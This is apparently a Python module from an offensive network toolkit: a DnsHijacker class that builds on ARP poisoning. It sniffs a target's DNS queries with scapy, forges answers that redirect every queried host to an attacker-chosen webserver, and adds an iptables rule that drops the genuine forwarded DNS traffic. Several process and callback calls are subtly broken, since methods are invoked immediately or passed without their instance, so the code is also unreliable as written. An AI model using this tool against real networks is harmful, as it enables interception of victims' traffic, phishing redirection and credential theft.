import platform
from multiprocessing import Process
from subprocess import PIPE, Popen

from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, IPv6, send, sniff

from .arp import ArpPoisoner


class DnsHijacker(ArpPoisoner):
	"""
	Parameters
	----------
	target : str
		The target's hostname or IP address
	webserver_ipv4 : str
		The IP addresses of the webserver as answer to DNS queries

	Methods
	-------
	start()
		Sends spoofed DNS responses to target with the answer
		pointing to self.webserver_ipv4
	"""

	def __init__(self, target, webserver_ipv4):
		"""
		Parameters
		----------
		target : str
			The target's hostname or IP address
		webserver_ipv4 : str
			The IP addresses of the webserver as answer to DNS queries
		"""
		super().__init__(target)
		self.webserver_ipv4 = webserver_ipv4

	@staticmethod
	def setup_config():
		"""Enables IPv4 forwarding and disables DNS Query forwarding"""

		# Enable IPv4 forwarding
		ArpPoisoner.setup_config()

		if (platform.system() == "Linux"):
			# Disable DNS Query forwarding
			firewall = "iptables -A FORWARD -p UDP --dport 53 -j DROP"
			Popen([firewall], shell=True, stdout=PIPE)

		if (platform.system() == "Windows"):
			print("[*] Please ensure DNS forwarding is disabled")

	def dns_sniffer(self):
		"""Sniff for DNS requests and pass them to dns_spoofer"""
		sniff(filter="udp and port 53 and host " + self.target_ipv4, prn=DnsHijacker.dns_spoofer)

	def dns_spoofer(self, pkt):
		"""Send spoofed DNS responses to the target"""
		if (pkt[IP].src == self.target_ipv4 and
			pkt.haslayer(DNS) and
			pkt[DNS].qr == 0 and				# DNS Query
			pkt[DNS].opcode == 0 and			# DNS Standard Query
			pkt[DNS].ancount == 0				# Answer Count
			#pkt[DNS].qd.qname in SPOOFED_SITE	# Query domain name
			):

			print("[*] Sending spoofed DNS response")

			if (pkt.haslayer(IPv6)):
				ip_layer = IPv6(src=pkt[IPv6].dst, dst=pkt[IPv6].src)
			else:
				ip_layer = IP(src=pkt[IP].dst, dst=pkt[IP].src)


			# Create the spoofed DNS response (returning back our IP as answer
			# instead of the endpoint)
			dns_resp =  ip_layer/ \
						UDP(
							dport=pkt[UDP].sport,
							sport=53
							)/ \
						DNS(
							id=pkt[DNS].id,					# Same as query
							ancount=1,						# Number of answers
							qr=1,							# DNS Response
							ra=1,							# Recursion available
							qd=(pkt.getlayer(DNS)).qd,		# Query Data
							an=DNSRR(
								rrname=pkt[DNSQR].qname,	# Queried host name
								rdata=self.webserver_ipv4,	# IP address of queried host name
								ttl = 10
								)
							)

			# Send the spoofed DNS response
			send(dns_resp, verbose=0)
			#print(f"Resolved DNS request for {pkt[DNS].qd.qname} by {self.webserver_ipv4}")

	def start(self):
		"""
		Poison the target's ARP cache and send spoofed DNS responses
		"""
		DnsHijacker.setup_config()

		# Create ARP poisoner
		process_arp_poisoner = Process(target=super().start())
		process_arp_poisoner.start()

		# Create DNS sniffer
		process_dns_sniffer = Process(target=DnsHijacker.dns_sniffer)
		process_dns_sniffer.start()

		# Wait either for the processes to complete or user to exit
		process_arp_poisoner.join()
		process_dns_sniffer.join()
